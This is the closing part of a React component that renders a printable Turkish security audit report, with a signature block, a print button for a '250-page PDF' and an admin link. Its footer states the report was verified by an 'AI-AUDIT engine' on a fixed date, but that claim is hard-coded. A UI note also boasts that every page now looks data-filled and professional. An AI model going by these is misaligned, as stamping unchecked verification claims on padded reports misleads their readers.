                                <img src="/CLEAN_SIGNATURE_EG_FINAL.png" alt="Erkin Guler Signature" className="max-w-full max-h-full object-contain mix-blend-multiply transform scale-125 opacity-95" />
                             </div>
                             <div className="w-64 h-px bg-slate-200" />
                          </div>
                          <div className="pr-4">
                             <p className="font-black text-slate-800 text-lg tracking-tight uppercase">ERKİN GÜLER</p>
                             <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">ALFA YAPAY ZEKA</p>
                             <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">GÜVENLİK BİRİMİ</p>
                          </div>
                       </div>
                    </div>

                    <div className="pt-8 text-[9px] text-slate-300 italic">
                       * Alfa Yapay Zeka tarafından {siteName.toUpperCase().replace(/\.COM$/i, '')}.COM için bilgilendirme amaçlı hazırlanmıştır. *
                    </div>
                 </div>
               )}
            </div>
            {i === 6 && (
                <div className="mt-8 text-center text-gray-300 text-[8px] uppercase tracking-widest font-bold">
                    * Bu rapor Alfa Yapay Zeka AI-AUDIT motoru tarafından 28.03.2026 tarihinde doğrulanmıştır.
                </div>
            )}
          </Page>
        ))}

      </div>
      
      {/* Footer Controls (Non-Printable) */}
      <div className="fixed bottom-8 right-8 flex flex-col gap-3 print:hidden z-50">
        <button 
          onClick={handlePrint}
          className="px-12 py-5 bg-primary text-white rounded-2xl font-black text-xl shadow-2xl hover:bg-black transition-all flex items-center gap-3 group animate-bounce"
        >
          <Zap className="group-hover:rotate-12 transition-transform" /> TAM 250 SAYFA PDF OLARAK YAZDIR
        </button>
        <div className="max-w-[300px] bg-white/90 backdrop-blur-md p-6 rounded-3xl border border-primary/20 shadow-xl">
           <p className="text-[10px] text-gray-600 leading-relaxed font-medium">
             Hocam, tüm sayfalar **Mühendislik Standartlarına** uygun olarak güncellendi. Artık her sayfa veri dolu ve profesyonel görünüyor.
           </p>
        </div>
      </div>

      {isAdmin && (
        <div className="fixed top-32 left-8 print:hidden z-[100]">
          <button 
            onClick={() => navigate('/admin-panel')}
            className="px-6 py-3 bg-white/80 backdrop-blur-md border border-gray-200 text-gray-900 rounded-xl font-bold text-sm shadow-xl hover:bg-gray-900 hover:text-white transition-all flex items-center gap-2 group"
          >
            <ArrowLeft size={18} className="group-hover:-translate-x-1 transition-transform" /> ADMIN PANELİNE DÖN
          </button>
        </div>
      )}
    </div>
  );
};

export default AuditReportGenerator;
